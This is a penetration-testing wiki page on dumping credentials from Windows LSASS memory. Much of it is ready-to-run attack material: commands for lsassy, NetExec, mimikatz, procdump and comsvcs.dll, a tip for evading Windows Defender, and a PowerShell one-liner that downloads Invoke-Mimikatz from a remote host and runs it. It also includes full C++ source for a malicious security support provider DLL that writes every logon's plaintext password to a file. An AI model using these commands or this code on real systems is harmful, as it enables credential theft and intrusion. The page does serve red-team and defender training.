---
description: MITRE ATT&CK™ Sub-technique T1003.001
---

# LSASS secrets

## Theory

The Local Security Authority Subsystem Service (LSASS) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens.&#x20;

## Practice

#### Dumping LSASS Memory

LSASS operations lead to the storage of credential material in its process memory. **With administrative rights only**, this material can be harvested (either locally or remotely).

{% tabs %}
{% tab title="Lsassy" %}
[Lsassy](https://github.com/Hackndo/lsassy) (Python) can be used to remotely extract credentials, from LSASS, on multiple hosts. As of today (22/07/2020), it is the Rolls-Royce of remote lsass credential harvesting.

* several dumping methods: comsvcs.dll, [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [Dumpert](https://github.com/outflanknl/Dumpert)
* several authentication methods: like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos)
* it can be used either as a standalone script, as a [NetExec](https://github.com/Pennyw0rth/NetExec) module or as a Python library
* it can interact with a Neo4j database to set [BloodHound](https://github.com/BloodHoundAD/BloodHound) targets as "owned"

```bash
# With pass-the-hash (NTLM)
lsassy -u $USER -H $NThash $TARGETS

# With plaintext credentials
lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS

# With pass-the-ticket (Kerberos)
lsassy -k $TARGETS

# NetExec Module examples
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
netexec smb $TARGETS -k -M lsassy
netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
```
{% endtab %}

{% tab title="Mimikatz" %}
[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials from lsass's process memory, or remotely to analyze a memory dump (dumped with [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) for example).

```bash
# (Locally) extract credentials from LSASS process memory
sekurlsa::logonpasswords

# (Remotely) analyze a memory dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

For Windows 2000, a special version of mimikatz called mimilove can be used.
{% endtab %}

{% tab title="Pypykatz" %}
[Pypykatz](https://github.com/skelsec/pypykatz) (Python) can be used remotely (i.e. offline) to analyze a memory dump (dumped with [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) for example).

```bash
pypykatz lsa minidump lsass.dmp
```
{% endtab %}

{% tab title="ProcDump" %}
The legitimate tool [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)) ([download](https://live.sysinternals.com/)) can be used to dump lsass's process memory.

```bash
procdump --accepteula -ma lsass lsass.dmp
```

{% hint style="info" %}
Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
{% endhint %}

```bash
# Find lsass's pid
tasklist /fi "imagename eq lsass.exe"

# Dump lsass's process memory
procdump -accepteula -ma $lsass_pid lsass.dmp
```

Once the memory dump is finished, it can be analyzed with [mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows) or [pypykatz](https://github.com/skelsec/pypykatz) (Python, cross-platform).
{% endtab %}

{% tab title="comsvcs.dll" %}
The native comsvcs.dll DLL found in `C:\Windows\system32` can be used with rundll32 to dump LSASS's process memory.

```bash
# Find lsass's pid
tasklist /fi "imagename eq lsass.exe"

# Dump lsass's process memory
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
```
{% endtab %}

{% tab title="PowerSploit" %}
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s exfiltration script [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) (PowerShell) can be used to extract credential material from LSASS's process memory.

```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Recovered credential material could be either plaintext passwords or NT hash that can be used with [pass the hash](../../../../../ad/movement/ntlm/pth.md) (depending on the context).
{% endhint %}

#### Security Support Provider DLLs

We may abuse [security support providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) to injected into LSASS.exe process custom SSP DLLs. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

We can directly **inject** [**SSP DLLs**](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) **into memory**. It prevent us from editing registries but using this approach, it will not persist accross reboot like with [this method](../../../../persistence/windows/lsa/security-support-provider-dlls.md).

{% tabs %}
{% tab title="Mimikatz" %}
Mimikatz support in memory SSP DLL injection to the LSASS process.

```powershell
mimikatz# privilege::debug
mimikatz# misc::memssp
```
{% endtab %}

{% tab title="Custom DLL" %}
Below is the code, originally taken from [mimikatz](https://github.com/gentilkiwi/mimikatz), adapted and refactored, that we can compile as our own Security Support Provider DLL. It intercepts authenticatin details and saves them to a file `c:\temp\lsa-pwned.txt`:

{% code title="sspcustom.cpp" %}
```cpp
#include "stdafx.h"
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#pragma comment(lib, "Secur32.lib")

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->Name = (SEC_WCHAR *)L"SSPCustom";
	PackageInfo->Comment = (SEC_WCHAR *)L"SSPCustom <o>";
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->wVersion = 1;
	return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	HANDLE outFile = CreateFile(L"c:\\temp\\lsa-pwned.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten = 0;
	
	std::wstring log = L"";
	std::wstring account = AccountName->Buffer;
	std::wstring domain = PrimaryCredentials->DomainName.Buffer;
	std::wstring password = PrimaryCredentials->Password.Buffer;

	log.append(account).append(L"@").append(domain).append(L":").append(password).append(L"\n");
	WriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);
	CloseHandle(outFile);
	return 0;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = 
{
	{
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
	}
};

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
	return 0;
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Alternatively, we may modify LSA Registry keys to add new SSPs which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called :

{% content-ref url="../../../../persistence/windows/lsa/security-support-provider-dlls.md" %}
[security-support-provider-dlls.md](../../../../persistence/windows/lsa/security-support-provider-dlls.md)
{% endcontent-ref %}

## References

{% embed url="https://en.hackndo.com/remote-lsass-dump-passwords/" %}

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" %}
